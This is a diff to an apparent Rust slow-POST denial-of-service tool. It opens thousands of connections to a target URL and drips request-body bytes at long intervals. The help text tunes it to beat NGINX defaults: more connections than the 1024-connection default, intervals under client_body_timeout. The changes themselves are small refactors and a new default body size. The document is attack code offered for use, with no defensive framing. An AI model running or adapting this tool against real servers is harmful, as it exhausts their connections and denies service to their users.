@@ -40,15 +40,15 @@ fn main() {
         .arg(Arg::with_name("content-length")
              .long("content-length")
              .value_name("BYTES")
-             .help("Content-Length request header."))
+             .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
         .arg(Arg::with_name("interval")
              .value_name("SECONDS")
              .long("interval")
-             .help("Byte to byte interval. Should be less than server's client_body_timeout (Nginx) value."))
+             .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
         .arg(Arg::with_name("connections-count")
              .value_name("INTEGER")
              .long("connections-count")
-             .help("Number of simultaneously opened connections. Should be more than server can handle (1024 in Nginx's default configuration)."))
+             .help("Number of simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
         .get_matches();
 
     let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
@@ -58,7 +58,7 @@ fn main() {
     };
     let host = parsed_url.host_str().unwrap().to_owned();
     let path = parsed_url.path();
-    let content_length = value_t!(arguments, "content-length", u32).unwrap_or(1000000);
+    let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
     let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
     let connections_count: usize = value_t!(arguments, "connections-count", usize).unwrap_or(2048);
 
@@ -82,12 +82,11 @@ fn main() {
                 tls_connector
                     .connect(&host, socket)
                     .map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("TLS connector error: {}", e)) })
-            }).map(|stream| MaybeHttpsStream::Https(stream)))
+            }).map(MaybeHttpsStream::Https))
         } else {
-            Box::new(socket.map(|stream| MaybeHttpsStream::Http(stream)))
+            Box::new(socket.map(MaybeHttpsStream::Http))
         };
 
-        let outer_connection_number = connection_number.clone();
         let connection = connector
             .and_then(move |mut socket| {
                 let _start_written = socket.write(start.as_bytes());
@@ -103,12 +102,13 @@ fn main() {
                     Ok(())
                 }).map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("Timer error: {}", e)) })
             });
-        handle.spawn(connection.map_err(move |e| println!("Connection: {} failed! Reason: {}", outer_connection_number, e)));
+        handle.spawn(connection.map_err(move |e| println!("Connection: {} failed! Reason: {}", connection_number, e)));
 
         if false { return Err("What could possibly go wrong here?") };
-        match connection_number <= connections_count {
-            true => Ok(future::Loop::Continue(connection_number + 1)),
-            false => Ok(future::Loop::Break(()))
+        if connection_number <= connections_count {
+            Ok(future::Loop::Continue(connection_number + 1))
+        } else {
+            Ok(future::Loop::Break(()))
         }
     });
 
